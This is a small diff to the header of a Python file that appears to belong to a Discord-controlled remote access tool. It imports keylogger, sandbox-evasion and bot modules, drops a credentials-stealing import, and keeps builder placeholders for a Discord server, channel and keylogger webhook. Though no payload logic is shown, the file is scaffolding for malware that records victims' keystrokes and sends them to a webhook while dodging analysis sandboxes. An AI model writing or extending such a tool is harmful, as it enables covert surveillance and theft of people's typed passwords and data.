@@ -7,9 +7,8 @@ import discord
 from discord.ext import commands
 from discord import app_commands
 
-from libraries import credentials, keylogger, sandboxevasion, disctopia
+from libraries import keylogger, sandboxevasion, disctopia
 
-# Constants (to be replaced by builder)
 GUILD = discord.Object(id="{GUILD}")
 CHANNEL = {CHANNEL}
 KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"
